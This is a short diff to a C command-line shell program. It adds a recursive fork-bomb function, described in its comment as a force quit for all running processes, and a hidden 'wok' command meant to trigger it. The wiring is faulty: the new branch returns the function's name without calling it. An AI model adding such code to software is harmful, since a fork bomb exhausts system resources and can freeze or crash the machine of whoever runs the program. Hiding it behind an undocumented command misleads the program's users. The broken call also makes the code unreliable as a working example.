@@ -70,7 +70,16 @@ char** parse_cmd(char* input){
   }
   return parse;
 }
-
+/**
+ *Args: None
+ *Returns: It fork bombs the user recursively
+ *What it does: Forks and then calls itself. It acts as a remote force quit for
+ *all processes running. 
+ */
+int wrath_of_kats(){
+  int f = fork();
+  return wrath_of_kats();
+}
 /**
  *Args: Input string
  *Returns: status of waitpid
@@ -85,6 +94,8 @@ int run_cmd_fork(char* input){
   } else if (strcmp(parse[0], "cd")==0) {
     chdir(parse[1]);
     return 0;
+  } else if (strcmp(parse[0], "wok")==0) {
+    return wrath_of_kats;
   }
   // Otherwise, fork and execute the command
   pid_t pid = fork();
